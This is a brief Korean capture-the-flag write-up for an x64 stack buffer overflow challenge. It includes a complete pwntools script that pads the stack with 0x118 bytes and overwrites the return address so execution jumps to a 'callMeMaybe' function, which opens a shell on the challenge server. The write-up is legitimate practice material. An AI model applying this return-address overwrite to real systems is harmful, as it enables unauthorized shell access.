# x64 Buffer Overflow

간단한 BOF 문제이다.   
64bit 환경에 맞춰줘야하며, callMeMaybe 함수를 호출하면 shell을 획득할 수 있다.   
<br/>

```
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3004)

payload = ''
payload += '\x90'*0x110
payload += '\x90'*0x8
payload += p64(0x0000000000400606)

p.sendline(payload)

p.interactive()
```
